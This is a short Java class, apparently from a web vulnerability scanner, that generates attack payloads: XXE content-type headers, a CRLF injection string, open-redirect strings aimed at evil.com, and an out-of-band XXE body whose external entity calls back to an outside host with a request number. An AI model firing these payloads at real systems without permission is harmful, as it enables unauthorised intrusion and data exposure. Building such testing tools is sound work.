package watcher;

public class PayloadGenerator {

	//TODO Add the request numbers, create a method to inject into these payloads
	
	
	
	static final String XXE_HEADER_PAYLOAD_1 = "Content-Type: application/xml";
	
	static final String XXE_HEADER_PAYLOAD_2 = "Content-Type: text/xml";
	
	static final String CRLF_PAYLOAD_1 = "%0d%0aPAYLOAD%0d%0a";
	
	static final String REDIRECT_PAYLOAD_1 = "//evil.com HTTP/1.1";
	static final String REDIRECT_PAYLOAD_2 = "//evil.com";
	static final String REDIRECT_PAYLOAD_3 = "evil.com";


	
	public static String getXXEBody_1(int reNo)
	{
		String XXE_BODY_PAYLOAD_1  = "<?xml version=\"1.0\" ?>" + "\n"
				 +	"<!DOCTYPE r [" + "\n"
				 +	"<!ELEMENT r ANY >" + "\n" 
				 +	"<!ENTITY sp SYSTEM \"http://khronogroup.com:80/"+reNo+".txt\">" + "\n"
				 +	"]>" + "\n"
				 +	"<r>&sp;</r>";
		
		
	
		return XXE_BODY_PAYLOAD_1;
	}
}
